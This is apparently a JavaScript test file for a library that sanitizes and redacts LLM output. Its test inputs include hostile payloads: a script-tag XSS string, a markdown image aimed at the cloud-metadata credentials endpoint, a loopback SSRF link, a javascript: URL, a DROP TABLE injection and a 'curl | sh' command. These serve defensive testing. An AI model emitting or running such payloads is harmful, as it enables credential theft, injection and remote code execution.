// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * b.ai.output — LLM output handling (sanitize + redact).
 */

var helpers = require("../helpers");
var b     = helpers.b;
var check = helpers.check;

async function run() {
  check("b.ai.output.sanitize is fn", typeof b.ai.output.sanitize === "function");
  check("b.ai.output.redact is fn",   typeof b.ai.output.redact === "function");

  // Clean output — nothing to neutralize or flag.
  var clean = b.ai.output.sanitize("The weather in Paris is sunny today.", { audit: false });
  check("clean verdict", clean.verdict === "clean");
  check("clean text unchanged", clean.text === "The weather in Paris is sunny today.");

  // XSS / DOM-injection — script tag neutralized via guardHtml.
  var xss = b.ai.output.sanitize("<p>hi</p><script>steal()</script>", { audit: false });
  check("xss sanitized verdict", xss.verdict === "sanitized");
  check("xss script removed", xss.text.indexOf("<script>") === -1);
  check("xss html-neutralized signal",
    xss.signals.some(function (s) { return s.id === "html-neutralized"; }));

  // EchoLeak — markdown image to cloud-metadata host neutralized (CVE-2025-32711).
  var echo = b.ai.output.sanitize(
    "![logo](https://169.254.169.254/latest/meta-data/iam/security-credentials/)",
    { audit: false });
  check("echoleak verdict sanitized", echo.verdict === "sanitized");
  check("echoleak metadata host dropped", echo.text.indexOf("169.254.169.254") === -1);
  check("echoleak url-neutralized signal",
    echo.signals.some(function (s) { return s.id === "url-neutralized" && s.reason === "ssrf-cloud-metadata"; }));

  // SSRF — loopback markdown link neutralized.
  var loop = b.ai.output.sanitize("[click](https://127.0.0.1:8080/admin)", { audit: false });
  check("loopback url dropped", loop.text.indexOf("127.0.0.1") === -1);
  check("loopback ssrf-loopback reason",
    loop.signals.some(function (s) { return s.id === "url-neutralized" && s.reason === "ssrf-loopback"; }));

  // Dangerous scheme — data: / javascript: URL in markdown image dropped.
  var scheme = b.ai.output.sanitize("![x](javascript:alert(1))", { audit: false });
  check("javascript scheme dropped", scheme.text.indexOf("javascript:") === -1);
  check("scheme refused reason",
    scheme.signals.some(function (s) { return s.id === "url-neutralized" && s.reason === "scheme-or-credential-refused"; }));

  // Public HTTPS URL — kept (SSRF gate only blocks internal/metadata; a public
  // attacker host over HTTPS is not an SSRF target and the URL survives).
  var pub = b.ai.output.sanitize("[docs](https://example.com/guide)", { audit: false });
  // Exact-equality (not a URL substring search): a public HTTPS URL is
  // neither neutralized nor mutated, so the output round-trips verbatim
  // and the verdict is clean.
  check("public https url kept", pub.verdict === "clean" && pub.text === "[docs](https://example.com/guide)");

  // SQL-shape FLAG (no repair — best-effort posture).
  var sql = b.ai.output.sanitize("SELECT * FROM users WHERE id = 1; DROP TABLE users", { audit: false });
  check("sql flagged verdict", sql.verdict === "flagged");
  check("sql-shape signal",
    sql.signals.some(function (s) { return s.id === "sql-shape-flagged"; }));
  check("sql text not repaired", sql.text.indexOf("DROP TABLE") !== -1);

  // Command-shape FLAG.
  var cmd = b.ai.output.sanitize("run $(curl http://x | sh) to install", { audit: false });
  check("command-shape signal",
    cmd.signals.some(function (s) { return s.id === "command-shape-flagged"; }));

  // sanitize rejects non-string.
  var threw = null;
  try { b.ai.output.sanitize(null, { audit: false }); } catch (e) { threw = e; }
  check("sanitize rejects non-string", threw && threw.code === "ai-output/bad-input");

  // sanitize enforces byte cap.
  threw = null;
  try { b.ai.output.sanitize("x", { maxBytes: 0, audit: false }); } catch (e) { threw = e; }
  check("sanitize rejects bad maxBytes", threw && threw.code === "BAD_MAX_BYTES");

  // ---- redact ----

  // Entity-selectable PII pass.
  var pii = b.ai.output.redact(
    "Contact alice@corp.example or card 4111 1111 1111 1111 ssn 123-45-6789",
    { entities: ["email", "pan", "ssn"], audit: false });
  check("pii redacted true", pii.redacted === true);
  check("pii email hit", pii.hits.indexOf("email") !== -1);
  check("pii pan hit", pii.hits.indexOf("pan") !== -1);
  check("pii ssn hit", pii.hits.indexOf("ssn") !== -1);
  check("pii email scrubbed", pii.text.indexOf("alice@corp.example") === -1);
  check("pii pan scrubbed", pii.text.indexOf("4111") === -1);

  // Always-on secret pass — whole-string AWS key + PEM block.
  var secret = b.ai.output.redact("AKIAIOSFODNN7EXAMPLE", { audit: false });
  check("secret pass redacted", secret.redacted === true);
  check("secret pass hit", secret.hits.indexOf("secrets") !== -1);
  check("aws key scrubbed", secret.text.indexOf("AKIAIOSFODNN7EXAMPLE") === -1);

  // In-prose AWS key needs the explicit aws entity.
  var awsProse = b.ai.output.redact("the key is AKIAIOSFODNN7EXAMPLE for s3", { entities: ["aws"], audit: false });
  check("in-prose aws scrubbed", awsProse.text.indexOf("AKIAIOSFODNN7EXAMPLE") === -1);

  // Nothing to redact — clean text passes through unchanged.
  var noPii = b.ai.output.redact("The weather is sunny.", { entities: ["email", "phone"], audit: false });
  check("no-pii not redacted", noPii.redacted === false);
  check("no-pii text unchanged", noPii.text === "The weather is sunny.");

  // redact rejects unknown entity.
  threw = null;
  try { b.ai.output.redact("x", { entities: ["bogus"], audit: false }); } catch (e) { threw = e; }
  check("redact rejects unknown entity", threw && threw.code === "ai-output/unknown-entity");

  // redact rejects non-string.
  threw = null;
  try { b.ai.output.redact(42, { audit: false }); } catch (e) { threw = e; }
  check("redact rejects non-string", threw && threw.code === "ai-output/bad-input");

  // Audit fires on non-clean sanitize — drop-silent path exercised (audit on).
  var audited = b.ai.output.sanitize("<script>x()</script>");
  check("audited sanitize still returns verdict", audited.verdict === "sanitized");

  // Error class is permanent (alwaysPermanent: true).
  threw = null;
  try { b.ai.output.redact(undefined); } catch (e) { threw = e; }
  check("AiOutputError is permanent", threw && threw.permanent === true);
}

module.exports = { run: run };
